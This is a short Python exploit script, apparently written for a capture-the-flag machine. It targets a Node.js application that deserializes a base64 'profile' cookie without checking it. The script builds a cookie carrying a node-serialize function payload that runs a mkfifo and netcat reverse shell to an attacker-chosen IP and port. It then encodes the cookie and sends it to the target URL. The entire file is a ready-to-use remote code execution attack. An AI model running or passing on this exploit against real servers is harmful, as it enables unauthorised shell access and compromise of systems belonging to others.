#/usr/bin/python3

import requests
import sys
import base64

if len(sys.argv) != 4:
	print("Usage: python3 {} <url e.g. http://10.10.10.10:3000> <ip> <port>" .format(sys.argv[0]))

else:
	url = sys.argv[1]
	ip = sys.argv[2]
	port = sys.argv[3]
	
print ("\nPreparing Cookie with {}:{}" .format(ip,port))

cookie1 = '{"username":"_$$ND_FUNC$$_function(){ require(\'child_process\').execSync(\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' +ip+ ' ' +port+ ' >/tmp/f\\", function puts(error, stdout, stderr) {});}()","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"7"}'

print("\nBase64 encoding + URL encoding cookie value")
newb64 = base64.b64encode(cookie1.encode("ascii"))
final = requests.utils.quote(newb64)

print("\nPreparing final cookie to send ..")
cookie2 = {"profile": final}

print("\nInjecting payload, check your listener")
s = requests.get(url, cookies=cookie2)
